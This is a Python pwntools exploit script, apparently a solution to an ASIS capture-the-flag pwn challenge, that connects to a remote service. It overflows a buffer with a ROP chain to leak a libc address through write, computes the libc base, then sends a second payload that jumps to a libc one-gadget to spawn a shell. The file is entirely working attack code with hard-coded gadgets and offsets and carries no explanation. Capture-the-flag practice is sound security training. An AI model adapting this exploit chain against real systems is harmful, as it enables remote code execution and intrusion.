from pwn import *

HOST = "37.139.17.37"
PORT = 1338
REMOTE = 1
if(REMOTE):
  s = remote(HOST,PORT)
else:
  s = remote('13.125.131.113',PORT)
s.recvuntil("Let's do something:")
gadget1 = 0x0000000000400cf3 # pop rdi ; ret
gadget2 = 0x0000000000400cf1 # pop rsi ; pop r15 ; ret

_read_plt = 0x04008E0
_write_plt = 0x00400890
_fork_got = 0x00602080

raw_input('d')
dat = ""
dat += "ASIS{N0T_R34LLY_4_FL4G}\x00"
dat += "A"*(0x20-len(dat))
dat += p64(0x006020E0+0x100)
dat += p64(gadget1)
dat += p64(0x1)
dat += p64(gadget2)
dat += p64(_fork_got)*2
dat += p64(_write_plt)
dat += p64(0x0400BB7)
s.send(dat)
libc = u64(s.recvuntil("\x7f")[-6:]+"\x00\x00") - 0xe4a50
print "LIBC : ", hex(libc)
dat = ""
dat += "ASIS{N0T_R34LLY_4_FL4G}\x00"
dat += "A"*(0x20-len(dat))
dat += p64(0xdeadbeef)
dat += p64(libc+0x000000000000000001b96)
dat += p64(0x80)
dat += p64(gadget1)
dat += p64(8)
dat += p64(gadget2)
length = len(dat)
dat += p64(0x006020E0+0x100-0x20+length+8*3) *2
dat += p64(_write_plt)
p = "TRANSMISSION_OVER\x00"
p += "A"*(0x28-len(p))
p += p64(libc+0x4f322)
dat += p
s.send(dat)
s.interactive()

